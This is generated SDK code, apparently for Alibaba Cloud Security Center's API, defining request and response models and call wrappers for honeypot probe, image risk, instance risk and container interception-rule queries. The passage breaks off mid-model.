model ListHoneypotProbeUuidRequest {
  controlNodeId?: string(name='ControlNodeId', description='The ID of the management node.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the ID.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe', example='host_probe'),
}

model ListHoneypotProbeUuidResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The total number of entries returned.', example='10'),
  data?: [ string ](name='Data', description='The resources of the probe.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='32C9C2A6-B837-538E-921B-90746CB*****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListHoneypotProbeUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotProbeUuidResponseBody(name='body'),
}

/**
 * @summary 查询已安装的探针
 *
 * @param request ListHoneypotProbeUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotProbeUuidResponse
 */
async function listHoneypotProbeUuidWithOptions(request: ListHoneypotProbeUuidRequest, runtime: Util.RuntimeOptions): ListHoneypotProbeUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.controlNodeId)) {
    query['ControlNodeId'] = request.controlNodeId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotProbeUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 查询已安装的探针
 *
 * @param request ListHoneypotProbeUuidRequest
 * @return ListHoneypotProbeUuidResponse
 */
async function listHoneypotProbeUuid(request: ListHoneypotProbeUuidRequest): ListHoneypotProbeUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotProbeUuidWithOptions(request, runtime);
}

model ListImageBuildRiskItemRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: zh. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model ListImageBuildRiskItemResponseBody = {
  data?: [ 
    {
      itemKey?: string(name='ItemKey', description='The type key of the risky build command.', example='key'),
      itemName?: string(name='ItemName', description='The type name of the risky build command.', example='itemName.'),
    }
  ](name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C619F37'),
}

model ListImageBuildRiskItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListImageBuildRiskItemResponseBody(name='body'),
}

/**
 * @summary Queries the types of risky image build commands.
 *
 * @param request ListImageBuildRiskItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListImageBuildRiskItemResponse
 */
async function listImageBuildRiskItemWithOptions(request: ListImageBuildRiskItemRequest, runtime: Util.RuntimeOptions): ListImageBuildRiskItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListImageBuildRiskItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the types of risky image build commands.
 *
 * @param request ListImageBuildRiskItemRequest
 * @return ListImageBuildRiskItemResponse
 */
async function listImageBuildRiskItem(request: ListImageBuildRiskItemRequest): ListImageBuildRiskItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageBuildRiskItemWithOptions(request, runtime);
}

model ListImageRegistryExtraRequest {
  registryId?: long(name='RegistryId', description='Image registry ID.
> You can obtain this parameter by calling the [PageImageRegistry](~~PageImageRegistry~~) interface.

This parameter is required.', example='25363'),
}

model ListImageRegistryExtraResponseBody = {
  imageRegistryExtraInfos?: [ 
    {
      aliUid?: long(name='AliUid', description='Alibaba Cloud account ID.', example='176618589410****'),
      authToken?: string(name='AuthToken', description='Authorization token.', example='64ad8ddf-6a4c-46b5-8dea-b105a06bd534'),
      id?: long(name='Id', description='Configuration ID.', example='113441'),
      namespace?: string(name='Namespace', description='Namespace of the image.', example='public-goods'),
      registryId?: long(name='RegistryId', description='Image registry ID.', example='25363'),
      registryType?: string(name='RegistryType', description='Image registry type. Values:

- **acr**: ACR
- **harbor**: Harbor
- **quay**: Quay
- **CI/CD**: Jenkins', example='harbor'),
    }
  ](name='ImageRegistryExtraInfos', description='Additional configuration information for the image registry.'),
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for the request and can be used to troubleshoot and locate issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model ListImageRegistryExtraResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListImageRegistryExtraResponseBody(name='body'),
}

/**
 * @summary Query Image Registry Extended Information.
 *
 * @param request ListImageRegistryExtraRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListImageRegistryExtraResponse
 */
async function listImageRegistryExtraWithOptions(request: ListImageRegistryExtraRequest, runtime: Util.RuntimeOptions): ListImageRegistryExtraResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryId)) {
    query['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListImageRegistryExtra',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query Image Registry Extended Information.
 *
 * @param request ListImageRegistryExtraRequest
 * @return ListImageRegistryExtraResponse
 */
async function listImageRegistryExtra(request: ListImageRegistryExtraRequest): ListImageRegistryExtraResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageRegistryExtraWithOptions(request, runtime);
}

model ListImageRegistryRegionResponseBody = {
  regions?: [ 
    {
      regionId?: string(name='RegionId', description='The region ID of the image.', example='cn-hangzhou'),
      regionName?: string(name='RegionName', description='The name of the region.', example='cn-hangzhou'),
    }
  ](name='Regions', description='An array that consists of regions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model ListImageRegistryRegionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListImageRegistryRegionResponseBody(name='body'),
}

/**
 * @summary The region ID of the image.
 *
 * @param request ListImageRegistryRegionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListImageRegistryRegionResponse
 */
async function listImageRegistryRegionWithOptions(runtime: Util.RuntimeOptions): ListImageRegistryRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListImageRegistryRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary The region ID of the image.
 *
 * @return ListImageRegistryRegionResponse
 */
async function listImageRegistryRegion(): ListImageRegistryRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageRegistryRegionWithOptions(runtime);
}

model ListImageRiskRequest {
  appName?: string(name='AppName', description='The name of the application.', example='e****'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the ID of the container cluster.', example='c80f79959fd724a888e1187779b13****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  imageName?: string(name='ImageName', description='The name of the image.', example='container-***:****'),
  namespace?: string(name='Namespace', description='The name of the namespace to which the repository belongs.', example='kube-sy****'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
}

model ListImageRiskResponseBody = {
  imageRiskList?: [ 
    {
      digest?: string(name='Digest', description='The digest value of the image.', example='3f8efc2184cf1d24936b49c27286a284714b77be34c80c9ee38ca6bf322445****'),
      endPointList?: [ 
        {
          domains?: [ string ](name='Domains', description='An array that consists the details of the domain name in the endpoint.'),
          type?: string(name='Type', description='The type of the domain name in the endpoint. Valid values:

*   **internet**: Internet
*   **intranet**: internal network', example='internet'),
        }
      ](name='EndPointList', description='An array that consists of the details of the endpoint.'),
      endpoints?: string(name='Endpoints', description='The endpoint of Container Registry.', example='https://172.20.XXX.XXX/test'),
      image?: string(name='Image', description='The image of the container.', example='.aliyuncs.com/sas_test/baseline:exploit'),
      imageAccessType?: string(name='ImageAccessType', description='The registration status of the image repository. Valid values:

*   **IN_SAS**: The image repository is registered with Security Center.
*   **NOT_IN_SAS**: The image repository is not registered with Security Center.', example='IN_SAS'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='f922bfeb6960436fe3f0e7b62fc6b9a0b47980986669c367c22433269404****'),
      internetURLs?: string(name='InternetURLs', description='The public endpoint of the image repository.', example='****registry-registry.cn-shenzhen-finance-1.cr.aliyuncs.com/xxxx/docker-****'),
      regionId?: string(name='RegionId', description='The region of the image repository.', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**: Jenkins', example='harbor'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-bk2l746eyxca1****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='scan_test'),
      repoNamespace?: string(name='RepoNamespace', description='The name of the namespace to which the repository belongs.', example='vultar***'),
      repoType?: string(name='RepoType', description='The type of the repository. Valid values:

*   `PUBLIC`
*   `PRIVATE`', example='PRIVATE'),
      statistics?: string(name='Statistics', description='The statistics on a security event.', example='{
	"baselineNum": 0,
	"newSuspicious": 0,
	"vul": 0
}'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='0.1.0'),
      tagImmutable?: int32(name='TagImmutable', description='Indicates whether the image version is immutable. If the image version is immutable, only the image of the latest version in the image repository can be overwritten. Valid values:

*   **0**: The image version is mutable.
*   **1**: The image version is immutable.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='624778f3-5bf2-423c-ac0c-47a62c05****'),
      vpcURLs?: string(name='VpcURLs', description='The endpoint of the image repository in the VPC.', example='****-registry-registry-vpc.cn-shenzhen-finance-1.cr.aliyuncs.com/xxxx/docker-****'),
    }
  ](name='ImageRiskList', description='An array that consists of security information about the image.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='050ACC7A-D4FD-55C6-B861-BA9569C1****'),
}

model ListImageRiskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListImageRiskResponseBody(name='body'),
}

/**
 * @summary Queries security information about a container image.
 *
 * @param request ListImageRiskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListImageRiskResponse
 */
async function listImageRiskWithOptions(request: ListImageRiskRequest, runtime: Util.RuntimeOptions): ListImageRiskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListImageRisk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries security information about a container image.
 *
 * @param request ListImageRiskRequest
 * @return ListImageRiskResponse
 */
async function listImageRisk(request: ListImageRiskRequest): ListImageRiskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageRiskWithOptions(request, runtime);
}

model ListInstanceCatalogRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou'),
  requirementIds?: [ long ](name='RequirementIds', description='The IDs of requirement items.'),
  standardIds?: [ long ](name='StandardIds', description='The IDs of standards.'),
  types?: [ string ](name='Types', description='The types of check standards.'),
}

model ListInstanceCatalogResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0D42A83F-CE33-5F54-A5AE-05DA39F59E1B'),
  vendors?: [ 
    {
      instanceTypes?: [ 
        {
          instanceSubTypes?: [ 
            {
              name?: string(name='Name', description='The name of the asset subtype.', example='SECURITY_GROUP'),
            }
          ](name='InstanceSubTypes', description='An array that consists of asset subtypes.'),
          name?: string(name='Name', description='The name of the asset type.', example='ECS'),
        }
      ](name='InstanceTypes', description='An array that consists of asset types.'),
      name?: string(name='Name', description='The name of the service provider.', example='ALIYUN'),
    }
  ](name='Vendors', description='An array that consists of the asset types by service provider.'),
}

model ListInstanceCatalogResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListInstanceCatalogResponseBody(name='body'),
}

/**
 * @summary Queries the asset types and asset subtypes for configuration assessment.
 *
 * @param request ListInstanceCatalogRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListInstanceCatalogResponse
 */
async function listInstanceCatalogWithOptions(request: ListInstanceCatalogRequest, runtime: Util.RuntimeOptions): ListInstanceCatalogResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.requirementIds)) {
    query['RequirementIds'] = request.requirementIds;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInstanceCatalog',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the asset types and asset subtypes for configuration assessment.
 *
 * @param request ListInstanceCatalogRequest
 * @return ListInstanceCatalogResponse
 */
async function listInstanceCatalog(request: ListInstanceCatalogRequest): ListInstanceCatalogResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInstanceCatalogWithOptions(request, runtime);
}

model ListInstanceRiskLevelsRequest {
  instanceList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the instance.', example='i-m5efigezp50l2cmb****'),
      uuid?: string(name='Uuid', description='The serial number of the instance.', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
    }
  ](name='InstanceList', description='The instances.'),
}

model ListInstanceRiskLevelsResponseBody = {
  instanceRiskLevels?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-m5efigezp50l2cmb****'),
      level?: string(name='Level', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**
*   **none**', example='high'),
      uuid?: string(name='Uuid', description='The UUID of the server for which you want to modify the defense rule. You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.', example='f2d6e901-1004-4ca8-9dae-53ec04a92765'),
    }
  ](name='InstanceRiskLevels', description='The risk levels of instances.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model ListInstanceRiskLevelsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListInstanceRiskLevelsResponseBody(name='body'),
}

/**
 * @summary Queries the risk levels of instances.
 *
 * @param request ListInstanceRiskLevelsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListInstanceRiskLevelsResponse
 */
async function listInstanceRiskLevelsWithOptions(request: ListInstanceRiskLevelsRequest, runtime: Util.RuntimeOptions): ListInstanceRiskLevelsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceList)) {
    query['InstanceList'] = request.instanceList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInstanceRiskLevels',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the risk levels of instances.
 *
 * @param request ListInstanceRiskLevelsRequest
 * @return ListInstanceRiskLevelsResponse
 */
async function listInstanceRiskLevels(request: ListInstanceRiskLevelsRequest): ListInstanceRiskLevelsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInstanceRiskLevelsWithOptions(request, runtime);
}

model ListInstanceRiskNumRequest {
  instanceList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the instance.', example='i-wz9fdluqx20mp2x7****'),
      uuid?: string(name='Uuid', description='The UUID of the instance.', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
    }
  ](name='InstanceList', description='The instances.'),
}

model ListInstanceRiskNumResponseBody = {
  instanceRiskNum?: [ 
    {
      instanceItem?: {
        instanceId?: string(name='InstanceId', description='The ID of the instance.', example='i-wz9fdluqx20mp2x7****'),
        uuid?: string(name='Uuid', description='The UUID of the instance.', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
      }(name='InstanceItem', description='The information about the instance.'),
      riskNumEntity?: {
        suspiciousHighCount?: int32(name='SuspiciousHighCount', description='The number of high-risk alerts.', example='5'),
        suspiciousLowCount?: int32(name='SuspiciousLowCount', description='The number of low-risk alerts.', example='7'),
        suspiciousMediumCount?: int32(name='SuspiciousMediumCount', description='The number of medium-risk alerts.', example='6'),
        vulHighCount?: int32(name='VulHighCount', description='The number of high-risk vulnerabilities.', example='1'),
        vulLowCount?: int32(name='VulLowCount', description='The number of low-risk vulnerabilities.', example='3'),
        vulMediumCount?: int32(name='VulMediumCount', description='The number of medium-risk vulnerabilities.', example='2'),
        weakPassWordCount?: int32(name='WeakPassWordCount', description='The number of weak passwords exposed on the Internet.', example='4'),
      }(name='RiskNumEntity', description='The statistics about the risks.'),
    }
  ](name='InstanceRiskNum', description='The information about the risks in the instance.'),
  requestId?: string(name='RequestId', description='The request ID.', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model ListInstanceRiskNumResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListInstanceRiskNumResponseBody(name='body'),
}

/**
 * @summary Queries the statistics about risks in instances.
 *
 * @param request ListInstanceRiskNumRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListInstanceRiskNumResponse
 */
async function listInstanceRiskNumWithOptions(request: ListInstanceRiskNumRequest, runtime: Util.RuntimeOptions): ListInstanceRiskNumResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceList)) {
    query['InstanceList'] = request.instanceList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInstanceRiskNum',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics about risks in instances.
 *
 * @param request ListInstanceRiskNumRequest
 * @return ListInstanceRiskNumResponse
 */
async function listInstanceRiskNum(request: ListInstanceRiskNumRequest): ListInstanceRiskNumResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInstanceRiskNumWithOptions(request, runtime);
}

model ListInterceptionHistoryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c7c190a82d9a048be9038d352840f****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  endTime?: long(name='EndTime', description='The end of the time range to query. The value is a UNIX timestamp.', example='1635575219000'),
  historyName?: string(name='HistoryName', description='The name of the alert.', example='Abnormal access'),
  interceptionTypes?: [ int32 ](name='InterceptionTypes', description='The types of exceptions.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  startTime?: long(name='StartTime', description='The start of the time range to query. The value is a UNIX timestamp.', example='1651290987000'),
}

model ListInterceptionHistoryResponseBody = {
  interceptionHistoryList?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c556c8133b5ad4378b7fc533ddbda****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='opa-terway-nonet****'),
      dstAppName?: string(name='DstAppName', description='The name of the destination application.', example='sas-web****'),
      dstNamespace?: string(name='DstNamespace', description='The destination namespace.', example='service****'),
      dstPort?: long(name='DstPort', description='The destination port range configured for the defense rule.', example='33'),
      dstRuleTargetName?: string(name='DstRuleTargetName', description='The name of the destination network object.', example='sas-web****'),
      firstTime?: long(name='FirstTime', description='The timestamp when the alert was first generated on the current day.', example='1639718858000'),
      id?: long(name='Id', description='The ID of the alert.', example='1126'),
      interceptionName?: long(name='InterceptionName', description='The name of the alert.', example='Abnormal access'),
      interceptionType?: int32(name='InterceptionType', description='The handling type. Valid values:

*   **0**: monitor
*   **1**: intercept
*   **2**: generate alert
*   **3**: allow', example='0'),
      lastTime?: long(name='LastTime', description='The timestamp when the alert was last generated on the current day.', example='1639731078000'),
      realDstAppName?: string(name='RealDstAppName', description='The name of the destination application.', example='sas-service****'),
      realDstImageName?: string(name='RealDstImageName', description='The name of the destination image.', example='sas-servi****'),
      realDstNamespace?: string(name='RealDstNamespace', description='The destination namespace.', example='service****'),
      realDstPodName?: string(name='RealDstPodName', description='The destination pod.', example='sas-web-84cc7dd9****'),
      realInterceptionType?: int32(name='RealInterceptionType', description='The handling type of actual hits. Valid values:

*   **0**: monitor
*   **1**: intercept
*   **2**: generate alert
*   **3**: allow', example='0'),
      realSrcAppName?: string(name='RealSrcAppName', description='The name of the source application.', example='sas-service****'),
      realSrcImageName?: string(name='RealSrcImageName', description='The name of the source image.', example='sas-servi****'),
      realSrcNamespace?: string(name='RealSrcNamespace', description='The source namespace.', example='service****'),
      realSrcPodName?: string(name='RealSrcPodName', description='The source pod.', example='sas-service-757b9d****'),
      riskLevel?: long(name='RiskLevel', description='The risk level. Valid values:

*   **-1**: unknown
*   **0**: none
*   **1**: low
*   **2**: medium
*   **3**: high', example='1'),
      ruleId?: long(name='RuleId', description='The ID of the defense rule based on which the alert was generated.', example='136'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='all****'),
      srcAppName?: string(name='SrcAppName', description='The name of the source application.', example='sas-web****'),
      srcNamespace?: string(name='SrcNamespace', description='The source namespace.', example='service****'),
      srcRuleTargetName?: string(name='SrcRuleTargetName', description='The name of the source network object.', example='sas-web****'),
      status?: long(name='Status', description='The handling status. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: manually handled
*   **3**: ignored', example='1'),
      tryCount?: int32(name='TryCount', description='The number of attempts.', example='34'),
    }
  ](name='InterceptionHistoryList', description='An array that consists of the alerts generated by defense rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D81DD78E-E006-5C65-A171-C8CB0904****'),
}

model ListInterceptionHistoryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListInterceptionHistoryResponseBody(name='body'),
}

/**
 * @summary Queries the alerts generated by defense rules.
 *
 * @param request ListInterceptionHistoryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListInterceptionHistoryResponse
 */
async function listInterceptionHistoryWithOptions(request: ListInterceptionHistoryRequest, runtime: Util.RuntimeOptions): ListInterceptionHistoryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.historyName)) {
    query['HistoryName'] = request.historyName;
  }
  if (!Util.isUnset(request.interceptionTypes)) {
    query['InterceptionTypes'] = request.interceptionTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionHistory',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the alerts generated by defense rules.
 *
 * @param request ListInterceptionHistoryRequest
 * @return ListInterceptionHistoryResponse
 */
async function listInterceptionHistory(request: ListInterceptionHistoryRequest): ListInterceptionHistoryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionHistoryWithOptions(request, runtime);
}

model ListInterceptionRulePageRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

This parameter is required.', example='cc41de13ab5474210bc0ce772a009****'),
  criteria?: string(name='Criteria', description='The query condition.', example='80'),
  criteriaType?: string(name='CriteriaType', description='The type of the query condition. Valid values:

*   **ID**
*   **RULE_NAME**
*   **SRC_TARGET**
*   **DST_TARGET**
*   **DST_PORT**
*   **RULE_SWITCH**
*   **INTERCEPTOR_TYPE**', example='DST_PORT'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='50'),
}

model ListInterceptionRulePageResponseBody = {
  interceptionRuleList?: [ 
    {
      dstTarget?: {
        appName?: string(name='AppName', description='The name of the application.', example='console'),
        imageList?: [ string ](name='ImageList', description='An array that consists of the affected images.'),
        namespace?: string(name='Namespace', description='The namespace.', example='test'),
